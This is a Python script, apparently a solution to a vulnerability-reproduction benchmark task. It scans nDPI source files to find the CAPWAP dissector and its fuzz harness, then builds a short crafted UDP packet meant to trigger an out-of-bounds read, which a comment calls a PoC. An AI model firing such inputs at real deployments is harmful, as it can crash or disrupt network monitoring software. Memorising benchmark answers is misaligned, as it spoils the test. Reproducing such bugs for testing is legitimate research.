import os
import re
import tarfile
import zipfile
from typing import Dict, Generator, Iterable, List, Optional, Tuple


def _safe_decode(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        try:
            return b.decode("latin-1", errors="ignore")
        except Exception:
            return ""


def _iter_files_from_dir(root: str) -> Generator[Tuple[str, bytes], None, None]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            rel = os.path.relpath(p, root)
            try:
                with open(p, "rb") as f:
                    yield rel, f.read()
            except Exception:
                continue


def _iter_files_from_tar(path: str) -> Generator[Tuple[str, bytes], None, None]:
    with tarfile.open(path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                yield name, data
            except Exception:
                continue


def _iter_files_from_zip(path: str) -> Generator[Tuple[str, bytes], None, None]:
    with zipfile.ZipFile(path, "r") as zf:
        for zi in zf.infolist():
            if zi.is_dir():
                continue
            name = zi.filename
            try:
                data = zf.read(zi)
                yield name, data
            except Exception:
                continue


def _iter_all_files(src_path: str) -> Generator[Tuple[str, bytes], None, None]:
    if os.path.isdir(src_path):
        yield from _iter_files_from_dir(src_path)
        return
    if tarfile.is_tarfile(src_path):
        yield from _iter_files_from_tar(src_path)
        return
    if zipfile.is_zipfile(src_path):
        yield from _iter_files_from_zip(src_path)
        return
    try:
        with open(src_path, "rb") as f:
            yield os.path.basename(src_path), f.read()
    except Exception:
        return


def _is_source_name(name: str) -> bool:
    lower = name.lower()
    return lower.endswith((".c", ".h", ".cc", ".cpp", ".hh", ".hpp"))


def _likely_fuzz_file(name: str, txt: str) -> bool:
    n = name.lower()
    if "fuzz" in n or "oss-fuzz" in n or "afl" in n:
        return True
    if "llvmfuzzertestoneinput" in txt.lower():
        return True
    return False


def _detect_input_layer(files: Iterable[Tuple[str, str]]) -> str:
    layer = None
    for name, txt in files:
        if not _likely_fuzz_file(name, txt):
            continue
        t = txt
        tl = t.lower()
        if "ndpi_search_setup_capwap" in t:
            layer = "capwap"
        if "ndpi_workflow_process_packet" in t:
            if "dlt_en10mb" in tl or "en10mb" in tl or "ether" in tl:
                return "l2"
            layer = layer or "l2"
        if "ndpi_detection_process_packet" in t or "ndpi_process_packet" in t:
            if layer != "l2":
                layer = layer or "l3"
    return layer or "l3"


def _extract_function_block(src: str, func_name: str) -> Optional[str]:
    idx = src.find(func_name)
    if idx < 0:
        return None

    start = src.rfind("\n", 0, idx)
    if start < 0:
        start = 0
    else:
        start += 1

    paren = src.find("(", idx)
    if paren < 0:
        return None

    i = paren
    depth = 0
    while i < len(src):
        c = src[i]
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                i += 1
                break
        i += 1
    if depth != 0:
        return None

    j = i
    while j < len(src) and src[j] not in "{;":
        j += 1
    if j >= len(src) or src[j] != "{":
        return None

    body_start = j
    k = body_start
    bdepth = 0
    while k < len(src):
        c = src[k]
        if c == "{":
            bdepth += 1
        elif c == "}":
            bdepth -= 1
            if bdepth == 0:
                k += 1
                return src[start:k]
        k += 1
    return None


def _parse_min_len_required(func: str) -> int:
    # Look for: if(payload_len < N) return;
    checks = []
    patterns = [
        r'if\s*\(\s*payload_len\s*<\s*(\d+)\s*\)\s*return',
        r'if\s*\(\s*payload_len\s*<=\s*(\d+)\s*\)\s*return',
        r'if\s*\(\s*packet->payload_packet_len\s*<\s*(\d+)\s*\)\s*return',
        r'if\s*\(\s*packet->payload_packet_len\s*<=\s*(\d+)\s*\)\s*return',
        r'if\s*\(\s*payload_packet_len\s*<\s*(\d+)\s*\)\s*return',
        r'if\s*\(\s*payload_packet_len\s*<=\s*(\d+)\s*\)\s*return',
        r'if\s*\(\s*len\s*<\s*(\d+)\s*\)\s*return',
        r'if\s*\(\s*len\s*<=\s*(\d+)\s*\)\s*return',
        r'if\s*\(\s*size\s*<\s*(\d+)\s*\)\s*return',
        r'if\s*\(\s*size\s*<=\s*(\d+)\s*\)\s*return',
    ]
    for pat in patterns:
        for m in re.finditer(pat, func, flags=re.IGNORECASE):
            try:
                n = int(m.group(1))
                if "<=" in m.group(0):
                    n = n + 1
                checks.append(n)
            except Exception:
                pass
    return max(checks) if checks else 0


def _parse_multibyte_reads(func: str) -> List[Tuple[int, int]]:
    reads: List[Tuple[int, int]] = []

    # Casts like (u_int32_t*)&payload[32] or (uint16_t*)(payload+10)
    cast_pat_1 = re.compile(
        r'\(\s*(?:const\s+)?(?:u_?int|uint)(16|32|64)_t\s*\*\s*\)\s*&\s*(?:packet->|packet\.)?payload\s*\[\s*(\d+)\s*\]',
        re.IGNORECASE,
    )
    cast_pat_2 = re.compile(
        r'\(\s*(?:const\s+)?(?:u_?int|uint)(16|32|64)_t\s*\*\s*\)\s*\(\s*(?:packet->|packet\.)?payload\s*\+\s*(\d+)\s*\)',
        re.IGNORECASE,
    )

    for m in cast_pat_1.finditer(func):
        bits = int(m.group(1))
        off = int(m.group(2))
        reads.append((off, bits // 8))
    for m in cast_pat_2.finditer(func):
        bits = int(m.group(1))
        off = int(m.group(2))
        reads.append((off, bits // 8))

    # Also detect common helper: ntohs(*(u_int16_t *)&payload[off])
    ntohs_pat = re.compile(
        r'ntohs\s*\(\s*\*\s*\(\s*\(\s*(?:const\s+)?(?:u_?int|uint)16_t\s*\*\s*\)\s*&\s*(?:packet->|packet\.)?payload\s*\[\s*(\d+)\s*\]\s*\)\s*\)',
        re.IGNORECASE,
    )
    ntohl_pat = re.compile(
        r'ntohl\s*\(\s*\*\s*\(\s*\(\s*(?:const\s+)?(?:u_?int|uint)32_t\s*\*\s*\)\s*&\s*(?:packet->|packet\.)?payload\s*\[\s*(\d+)\s*\]\s*\)\s*\)',
        re.IGNORECASE,
    )
    for m in ntohs_pat.finditer(func):
        reads.append((int(m.group(1)), 2))
    for m in ntohl_pat.finditer(func):
        reads.append((int(m.group(1)), 4))

    return reads


def _choose_payload_len_from_source(all_sources: Iterable[Tuple[str, str]]) -> int:
    capwap_func = None
    for name, txt in all_sources:
        if "ndpi_search_setup_capwap" in txt:
            block = _extract_function_block(txt, "ndpi_search_setup_capwap")
            if block:
                capwap_func = block
                break

    if not capwap_func:
        return 5

    min_req = _parse_min_len_required(capwap_func)
    reads = _parse_multibyte_reads(capwap_func)

    candidates: List[int] = []
    for off, width in reads:
        if width <= 1:
            continue
        cand = max(min_req, off + 1)
        if cand < off + width:
            candidates.append(cand)

    if candidates:
        return max(1, min(candidates))

    if min_req > 0:
        if min_req + 1 <= 512:
            return min_req + 1
        return min_req
    return 33


def _ipv4_checksum(hdr: bytes) -> int:
    if len(hdr) % 2 == 1:
        hdr += b"\x00"
    s = 0
    for i in range(0, len(hdr), 2):
        s += (hdr[i] << 8) | hdr[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _build_ipv4_udp_packet(payload: bytes, dst_port: int = 5247, src_port: int = 12345) -> bytes:
    ip_ver_ihl = 0x45
    ip_tos = 0
    total_len = 20 + 8 + len(payload)
    ip_id = 0
    ip_flags_frag = 0
    ip_ttl = 64
    ip_proto = 17
    ip_csum = 0
    src_ip = b"\x01\x01\x01\x01"
    dst_ip = b"\x02\x02\x02\x02"

    ip_hdr = bytearray(20)
    ip_hdr[0] = ip_ver_ihl
    ip_hdr[1] = ip_tos
    ip_hdr[2] = (total_len >> 8) & 0xFF
    ip_hdr[3] = total_len & 0xFF
    ip_hdr[4] = (ip_id >> 8) & 0xFF
    ip_hdr[5] = ip_id & 0xFF
    ip_hdr[6] = (ip_flags_frag >> 8) & 0xFF
    ip_hdr[7] = ip_flags_frag & 0xFF
    ip_hdr[8] = ip_ttl
    ip_hdr[9] = ip_proto
    ip_hdr[10] = (ip_csum >> 8) & 0xFF
    ip_hdr[11] = ip_csum & 0xFF
    ip_hdr[12:16] = src_ip
    ip_hdr[16:20] = dst_ip
    csum = _ipv4_checksum(bytes(ip_hdr))
    ip_hdr[10] = (csum >> 8) & 0xFF
    ip_hdr[11] = csum & 0xFF

    udp_len = 8 + len(payload)
    udp_hdr = bytearray(8)
    udp_hdr[0] = (src_port >> 8) & 0xFF
    udp_hdr[1] = src_port & 0xFF
    udp_hdr[2] = (dst_port >> 8) & 0xFF
    udp_hdr[3] = dst_port & 0xFF
    udp_hdr[4] = (udp_len >> 8) & 0xFF
    udp_hdr[5] = udp_len & 0xFF
    udp_hdr[6] = 0
    udp_hdr[7] = 0

    return bytes(ip_hdr) + bytes(udp_hdr) + payload


def _build_ethernet_frame(ip_packet: bytes) -> bytes:
    dst_mac = b"\x00\x11\x22\x33\x44\x55"
    src_mac = b"\x66\x77\x88\x99\xaa\xbb"
    eth_type = b"\x08\x00"
    return dst_mac + src_mac + eth_type + ip_packet


def _build_capwapish_payload(n: int) -> bytes:
    if n <= 0:
        return b""
    b = bytearray([0] * n)
    if n >= 1:
        b[0] = 0x00
    if n >= 2:
        b[1] = 0x10
    if n >= 3:
        b[2] = 0x01
    return bytes(b)


class Solution:
    def solve(self, src_path: str) -> bytes:
        text_files: List[Tuple[str, str]] = []
        for name, data in _iter_all_files(src_path):
            if not _is_source_name(name):
                continue
            if len(data) > 4_000_000:
                data = data[:4_000_000]
            txt = _safe_decode(data)
            text_files.append((name, txt))

        layer = _detect_input_layer(text_files)
        payload_len = _choose_payload_len_from_source(text_files)

        # Keep PoC small; cap at a reasonable size for safety
        if payload_len <= 0:
            payload_len = 5
        if payload_len > 256:
            payload_len = 33

        payload = _build_capwapish_payload(payload_len)

        if layer == "capwap":
            return payload

        ip_pkt = _build_ipv4_udp_packet(payload=payload, dst_port=5247, src_port=12345)

        if layer == "l2":
            return _build_ethernet_frame(ip_pkt)

        return ip_pkt